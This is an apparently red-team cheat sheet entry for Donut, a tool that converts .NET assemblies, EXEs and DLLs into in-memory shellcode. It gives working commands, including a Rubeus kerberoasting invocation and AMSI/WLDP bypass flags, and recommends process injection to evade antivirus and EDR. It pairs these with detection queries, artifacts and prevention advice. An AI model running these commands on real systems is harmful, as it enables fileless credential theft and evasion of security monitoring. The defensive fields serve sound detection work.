name: Donut - In-Memory .NET/EXE/DLL to Shellcode
description: Donut converts .NET assemblies, EXEs, DLLs, VBS/JS, and XSLT into position-independent shellcode that loads and runs the payload entirely in memory (no disk write). Combined with a shellcode runner/process injection, it lets you execute tools like Rubeus, SharpHound, or Mimikatz fileless, defeating on-disk AV and complicating EDR.
notes:
=== CONVERT A .NET ASSEMBLY TO SHELLCODE ===
  donut -i Rubeus.exe -o rubeus.bin
  # With arguments passed to the assembly:
  donut -i Rubeus.exe -p "kerberoast /outfile:hashes.txt" -o rubeus.bin

=== ENTRYPOINT / CLASS / METHOD (for DLLs) ===
  donut -i Lib.dll -c Namespace.Class -m Method -o out.bin

=== ARCH + BYPASS OPTIONS ===
  donut -i tool.exe -a 2 -o out.bin         # -a 2 = x64 (1=x86, 3=both)
  donut -i tool.exe -b 3 -o out.bin         # -b 3 = bypass AMSI+WLDP
  donut -i tool.exe -e 3 -o out.bin         # -e = entropy/encryption level
  donut -i tool.exe -f 1 -o out.bin         # -f format (1=binary,2=base64,...)

=== RUN THE SHELLCODE (needs a loader) ===
  # Inject into a process with a runner:
  #   process-injection-runner / C2 shinject / custom C# or Nim loader
  # The payload executes in memory - nothing hits disk

=== PYTHON API ===
  # donut.py exposes create() for scripting payload generation

=== ALTERNATIVES ===
  sRDI            # DLL -> shellcode
  Shellter        # inject into legit PE
  msfvenom        # classic shellcode (more signatured)
  C2 built-ins    # Cobalt/Havoc execute-assembly

recommended.note: Inject the generated shellcode into a process.
Run the shellcode via a PowerShell loader.
Pair with AMSI bypass for in-memory .NET execution.

defense.why_it_works: Donut produces encrypted, position-independent shellcode that reflectively loads a payload in memory, so nothing is written to disk and static/on-disk AV has no file to scan. Built-in AMSI/WLDP bypass hampers in-memory .NET scanning.
defense.prerequisites: Code execution on the host; a shellcode loader/injector to run the output.
defense.impact: Fileless execution of offensive .NET/PE tools, evading signature-based and on-disk detection.
defense.detection: [MITRE T1027/T1620] Behavioral: RWX memory allocation + remote thread creation; CLR loaded into a non-.NET process; AMSI tampering; unbacked executable memory; ETW/EDR reflective-load telemetry.
defense.artifacts: Injected RWX regions; CLR DLLs in unexpected processes; AMSI patch indicators; no payload file on disk.
defense.splunk_spl:
index=windows EventCode=8 SourceImage=* TargetImage=*
| search GrantedAccess=0x1fffff
| table _time, SourceImage, TargetImage, Computer
defense.sentinel_kql:
DeviceEvents
| where ActionType in ("CreateRemoteThreadApiCall","WriteToLsassProcessMemory","AmsiScanBufferTampering")
| project Timestamp, DeviceName, InitiatingProcessFileName, ActionType
defense.prevention: EDR with in-memory/behavioral detection; enable AMSI and alert on tampering; attack-surface-reduction rules; block unsigned/unexpected process injection; application control (WDAC); monitor RWX + remote threads.

detections.name: In-memory reflective loading / injection (donut-style)
detections.logic:
DeviceEvents
| where ActionType in ("CreateRemoteThreadApiCall","AmsiScanBufferTampering")
| summarize count() by DeviceName, InitiatingProcessFileName, ActionType, bin(Timestamp, 5m)
detections.false_positives: Some legitimate .NET JIT/profiling and injection-based security tools
detections.tuning: Correlate RWX allocation + remote thread + CLR load in a non-.NET parent
